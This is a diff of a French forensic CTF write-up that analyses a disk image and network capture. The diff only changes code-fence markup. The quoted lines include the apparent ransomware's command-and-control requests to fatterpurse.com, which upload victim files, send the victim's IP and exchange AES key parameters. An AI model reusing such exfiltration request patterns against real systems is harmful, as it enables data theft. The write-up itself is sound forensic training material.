@@ -67,7 +67,7 @@ Level 3
 
 On dispose d'un fichier *flash.img* qui a été compressé. Une fois décompressé on le passe à *file* qui nous indique :  
 
-```plain
+```
 flash.img: DOS/MBR boot sector
 ```
 
@@ -75,7 +75,7 @@ Avec *ghex* (un éditeur hexadécimal) on voit les lettres *NTFS*. Une recherche
 
 On monte le disque très facilement :  
 
-```plain
+```
 mount -t ntfs -o ro flash.img /mnt/
 ```
 
@@ -98,7 +98,7 @@ La plupart des requêtes sont du type *Gh98zret.php?filename=Exhibit - A (1).gif
 
 La requête et la réponse sont les suivantes :  
 
-```plain
+```
 GET /Gh98zret.php?filename=Exhibit - A (1).gif&originalMD5=C699083BAF4FC584667DD8F25061C2F1 HTTP/1.1
 Accept-Encoding: identity
 Host: fatterpurse.com
@@ -124,7 +124,7 @@ Comme on disque des images chiffrés j'ai tenté de déchiffrer l'image via ce q
 
 Si on recherche les requêtes sans le mot clé *filename* on trouve d'autres informations :  
 
-```plain
+```
 Gh98zret.php?crypt_init=1&sys=2
 Gh98zret.php?crypt_init=2&sys=2
 Gh98zret.php?crypt_init=3&sys=2
@@ -141,7 +141,7 @@ Gh98zret.php?victimoutsideip=55.43.2.18&sys=1
 
 Les requêtes *crypt\_init* se retrouvent dans les sessions 2020 à 2023 de *ChaosReader*. Les réponses correspondantes disposent dans le body de données encodées en base64 qui une fois décodées sont les suivantes :  
 
-```plain
+```
 Crypt_Init - AES
 Crypt_Init - CBC                                                                                                                                                                                               
 IV - 00000000000000000000000000--- snip ---0000000000000000000000000000
